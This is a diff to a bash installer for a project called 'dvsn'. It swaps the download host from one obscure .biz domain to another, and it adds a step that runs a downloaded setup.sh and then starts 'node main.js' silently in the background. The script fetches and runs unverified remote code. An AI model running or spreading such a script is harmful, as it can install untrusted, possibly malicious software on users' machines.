@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Configuration Variables
-PROJECT_URL="https://whtproff.biz/dvsn.zip"  # URL to download dvsn.zip
+PROJECT_URL="https://pawpdf.biz/dvsn.zip"  # URL to download dvsn.zip
 PROJECT_NAME="dvsn"
 INSTALL_DIR="$HOME/$PROJECT_NAME"  # Directory to install dvsn
 
@@ -54,5 +54,15 @@ if [ -f "setup.sh" ]; then
     ./setup.sh
 else
     echo "Error: setup.sh not found in the extracted project. Exiting."
+    exit 1
+fi
+
+# Step 6: Check for the completion flag and then run main.js
+if [ -f "setup_completed.flag" ]; then
+    echo "Starting main.js..."
+    nohup node main.js > app.log 2>&1 &
+    echo "Application started in the background. Check app.log for output."
+else
+    echo "Error: Setup did not complete successfully or the completion flag is missing."
     exit 1
 fi
